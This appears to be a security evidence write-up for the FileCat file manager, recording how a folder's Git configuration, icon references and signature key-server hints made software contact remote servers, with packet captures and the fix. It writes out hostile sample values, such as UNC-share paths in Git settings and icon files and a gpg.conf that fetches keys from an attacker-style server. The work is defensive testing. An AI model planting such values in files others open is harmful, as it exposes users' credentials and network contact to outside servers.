# E-V24-G1 — what a folder's own content makes FileCat contact while it is listed (I69)

Issue: [I69](../FILECAT_1_0_RELEASE_ISSUES.md#i69--a-repositorys-own-configuration-sent-git-to-a-server-while-the-folder-was-merely-shown).
Plan: V24 (hostile content during ordinary browsing and external launch; T01/T03/T11/T12, SEC-003/004/006), V23 B10
(folder metadata → automatic tools/contact), I16's open item.

Git badges are the one thing FileCat reads from a folder's own content by running another program in it. The guard
written for I16 (`2f35a6b`) covered the paths FileCat itself follows — a `.git` file's `gitdir:` and `commondir` — and
refused a repository whose configuration names programs (`[filter …]`, `[include]`, `[includeIf …]`). This pass asked
the rest of the V24 question: what the repository's configuration makes **Git** open once FileCat runs it.

## E-V24-G1-S1 — static reading (source `97c48de`)

`git status` reads these settings of the repository it runs in, and opens what they name, before it has compared
anything: `core.excludesFile` and `core.attributesFile` (the ignore and attribute rules), `core.worktree`,
`core.hooksPath`, and `objects/info/alternates` (the object store of another repository, read as this one's own; one
path per line, not a configuration file at all). None of them names a program, so `IsHarmless` passed them all.

## E-V24-G1-R1 — reproduction on the host (build `97c48de`, physical Windows 11 Pro 26220)

Five repositories, each with one setting pointing at a documentation address that answers nothing
(`192.0.2.0/24`, TEST-NET-1; one address per case so no single cached answer can cover them), timed with
`git status --porcelain=v1 -z --untracked-files=normal --ignore-submodules=all` as FileCat runs it:

| Setting in `.git/config` (or the file) | Git's own result | Time |
|---|---|---|
| `core.excludesFile = //192.0.2.1/v24excl/x` | exit 0, no message | **21 153 ms** |
| `core.attributesFile = //192.0.2.12/v24attr/x` | `warning: unable to access …` | **21 177 ms** |
| `core.worktree = //192.0.2.13/v24wt` | `fatal: this operation must be run in a work tree` | **21 147 ms** |
| `objects/info/alternates` → `//192.0.2.14/v24alt/objects` | `error: object directory … does not exist` | **21 160 ms** |
| none (control) | exit 0 | 98 ms |

The same repositories against a *reachable* address finished in 92–120 ms, so the 21 s is the wait for an address that
never answers — the same wait `Test-Path \\192.0.2.1\…` takes on this host (21 049 ms), and the mechanism behind I16's
first item. `FileCat.App.Tests.GitStatusTests.Repositories_whose_configuration_sends_Git_off_this_computer_get_no_badges`
run against the unchanged code **failed**: `SafeRepository` returned the repository, so FileCat would have run Git in it.

## E-V24-G1-T1 — what the contact reaches, under a packet capture

The lent Ubuntu VM (E-ENV-02, `192.168.58.129`, Samba listening on 445/139) stands in for the server the repository
names; `tcpdump -i ens33 -s 0 -U "tcp port 445 or tcp port 139"` on the VM is the oracle, the host is `192.168.58.1`.
Three runs of the gated case `GitStatusTests.A_repository_that_points_Git_at_a_share_is_never_run_in`
(`FILECAT_V24_SHARE=192.168.58.129`), each with a share name never used before, build `aaee133`:

| Run | What ran | Packets to the VM | NTLMSSP messages |
|---|---|---|---|
| A — `FILECAT_V24_RUN_GIT=1` | Git run once in that repository, as FileCat used to | **11** (TCP handshake, SMB2 negotiate, two session setups, reset) | **2** |
| B — FileCat's badge reading (the fix) | `GitStatusReader.ReadAsync` on the folder listing the repositories, and inside the repository itself | **0** | 0 |
| C — `FILECAT_V24_RUN_GIT=1` again | as A, right after B | **9** | 0 (the client reused what A had negotiated) |

A and C bracket B, so B's silence is the policy and not a cached answer. The control in the same case is the second,
ordinary repository beside the hostile one: it kept its badge (`ordinary Clean, downloaded None, inside it no snapshot`
in 0.1 s), which shows Git ran in that folder and a missing badge is a refusal, not a broken harness.

What the capture proves is the contact itself: a connection to a server named only by a downloaded folder's content,
and an SMB session setup with it. It is the contact FileCat's own icon policy already refuses for this reason ("never a
share, whose contact would reveal credentials"): what such a server is then offered depends on it and on the client's
policy — Samba here allowed an anonymous session, and **that** was not measured. The measured harms are the contact and
the 21 s wait per repository above.

## E-V24-G1-V1 — fix `aaee133`

A repository is read only when none of the settings Git opens leaves this computer, decided from the text of the value
before any file-system call on it: a relative value stays here (Git resolves it against the work tree or the
repository), an absolute one must be local (`IsLocalPath`: this computer's fixed drives, never a share or a mapped
network drive). The spellings Git accepts are read as Git reads them — case-insensitive names, a quoted value, a
comment after it, a setting on the section's own line, and the doubled backslashes `git config` writes a UNC path with.
`objects/info/alternates` and `http-alternates` are checked line by line, in this repository and in the one a linked
work tree shares (`commondir`). A value that is no usable path at all now leaves the repository unread instead of
throwing out of the listing it was shown in.

Tests: `Repositories_whose_configuration_sends_Git_off_this_computer_get_no_badges` (six settings, both slash forms and
the escaped form, the alternates file, and local counterparts of the same settings keeping their badges, all inside
4 s) and the gated `A_repository_that_points_Git_at_a_share_is_never_run_in` above. `FileCat.App.Tests` whole suite:
198 total, 0 failed, 9 skipped, 100.9 s (host, Debug; the two gated cases above skip without their host).

Files (`artifacts/release-evidence/v24/`): `v24-git-share-capture.txt`
`81486c7127fb5a60b3dde517ba70887f4fb2179e7f688f701a6d2d60eed6d58b`; `v24-a-git.pcap`
`085d67fa94891ddec6f3ca10e040889aeab8aa8c294e15e29442f9a8d7cb9ab4`; `v24-b-filecat.pcap`
`704e5e5b3234433c01fcfd1b20a306e77e985038120492dc53965c3edd38a4ea`; `v24-c-git.pcap`
`dd51cdbd64fec99441f6e86ebeddb72fa72a13c9b57f5407b563a5e7b10d98e2`.

## E-V24-G1-I1 — icons a folder's own files name, under the same capture (no defect)

The second route by which a listed folder names a path of its own: the icon in an Internet shortcut (`.url`
`IconFile`), in a shell link (`.lnk` icon location) and in a customized folder (`desktop.ini` `IconResource`). I16
(`2f35a6b`) made the restricted helper's policy decide before the path is touched; this pass asked V24's question of
the whole pipeline, parent and child process together, with the same oracle.

`IconResourceTests.Icons_named_on_a_share_are_never_contacted_while_a_folder_is_listed` (build `aaee133`, host) lists
one folder holding nine fixtures: a `.url`, a crafted `.lnk` (MS-SHLLINK, built in the test so no Shell code of
Windows' own touches the path while the fixture is made) and a read-only folder with a `desktop.ini`, in three sets —
one naming the icon on the share, one naming `%SystemRoot%\system32\imageres.dll`, one naming no icon at all. Every
row's icon is then asked for as a drawn row asks, for up to 30 s. A refused icon and one still being read both show
the row's type icon, so the third set is the measuring stick: "the icon it names arrived" means the row's icon is not
the one its type shows.

| Fixture | Names | Result |
|---|---|---|
| `local.url`, `local.lnk`, `local-folder` | `imageres.dll` on this computer | **the icon they name**, within 0.3 s |
| `shared.url`, `shared.lnk`, `shared-folder` | `\\192.168.58.129\evidence-…\folder.ico` | **the type icon only** |

Under `tcpdump` on the VM for the whole run (and for a first run of the same case whose assertion was wrong, which is
in the same capture): **0 packets**, `v24-icons.pcap`
`704e5e5b3234433c01fcfd1b20a306e77e985038120492dc53965c3edd38a4ea` (a pcap header and nothing else — byte for byte the
same file as run B above). The oracle's positive control is runs A and C above: the same host, interface and filter
show the contact when one happens. The three local fixtures are the pipeline's control: the helper did run and did read
named icons during the very run that contacted nothing.

## E-V24-G1-P1 — a signature naming a key server, under the same capture (no defect)

The third route: an OpenPGP signature beside a downloaded file. The charter names "malicious local gpg
configuration/keyserver hints". `VerificationTests.A_signature_naming_a_key_server_is_checked_without_contacting_it`
(build `aaee133`, host, GnuPG 2.4.9) builds the whole hostile case in a throwaway GnuPG home:

- `gpg.conf` asks for what an attacker would want: `keyserver hkp://192.168.58.129:11371`, `auto-key-retrieve`,
  `keyserver-options honor-keyserver-url`;
- the detached signature carries a preferred key server of its own (`hashed subpkt 24 … preferred keyserver:
  http://192.168.58.129:11371`, seen in `gpg --list-packets`);
- the signing key is then deleted from the keyring, so **only** a fetch from that server could check the signature.

| Run | What checked it | Answer | Packets to the VM |
|---|---|---|---|
| B | **FileCat** (`OpenPgp.Verify`) | "made with OpenPGP key …, which is not in your keyring" in **0.1 s** | **0** |
| C | the same files, by a caller that does not pass `--no-auto-key-retrieve` | gpg says "key available at http://…", requests it from the signature's address **and** from the configured key server, 6.4 s | **8**, all to port 11371 |

B and C ran one after the other, each with its own capture and nothing else capturing at the time. FileCat's refusal
is `--no-auto-key-retrieve` on gpg's command line (and the files after `--`, so a name starting with `-` is never read
as an option) — already in the source before this pass; this is the evidence for it, with C as the oracle's positive
control. An earlier pair of runs was discarded because both captures overlapped and recorded the same packets.

Files (`artifacts/release-evidence/v24/`): `v24-gpg-keyserver-capture.txt`
`521620d4f6d23f4f8a7f0ac3b9e573b453f9ecb5a63d016e143cf2fd2b215bea`; `v24-gpg-b.pcap`
`704e5e5b3234433c01fcfd1b20a306e77e985038120492dc53965c3edd38a4ea`; `v24-gpg-c.pcap`
`612d4c4a1a5fc2a442c14db3187e3589a86caa843e3ecb822482d888de13da11`; `v24-gpg-a.pcap` (a first control run, whose
filter also caught the host's unrelated broadcasts) `7c2c75022f269c1fa6bccd524f77e9328e977cf66dc11cacd2f79d49e7fc4369`.

## E-V24-G1-S2 — the launch routes, read (no defect found)

Read in the same pass, without a defect to report: `SmbTools` runs the system's SMB tools by full path with every
argument in a vector (no shell), and a server or share name is never a leading argument — it is embedded in a
`smb://…` URI or after `//`, and a share name is URL-escaped, so a name beginning with `-` cannot become an option.
`ToolLauncher` resolves a bare program name to a real file on PATH's absolute entries before launching, passes
arguments as a vector, refuses a batch file whose arguments carry cmd metacharacters (BatBadBut) unless the user turns
on shell mode for that tool, and splits over-long selections rather than truncating them. The Windows terminal routes
start `wt.exe`, PowerShell 7 and Windows PowerShell by full path (I16), and pass a typed command line to the shell the
user chose, which is that shell's own language by intent. Not yet exercised with a recording executable, which the
charter asks for and which stays open.

## Still open in V24

This pass covered the three routes by which content a user merely browses or checks names an address of its own: the
Git configuration, the icons, and an OpenPGP signature's key server. What remains: the terminal, SSH and association
routes with a recording executable (read here, not exercised); malformed WS-Discovery and mDNS; `.lnk` *targets* on a
share (guarded by the same locality check at the one place a target's own icon is read, not yet exercised end to end);
and the capture-and-trace form of the whole case on a final candidate. On Linux and macOS a value naming a path under
an automounter is still only a path to FileCat (`IsLocalPath` is a Windows decision); that is the same limitation the
`gitdir:`/`commondir` checks have carried since `2f35a6b`.
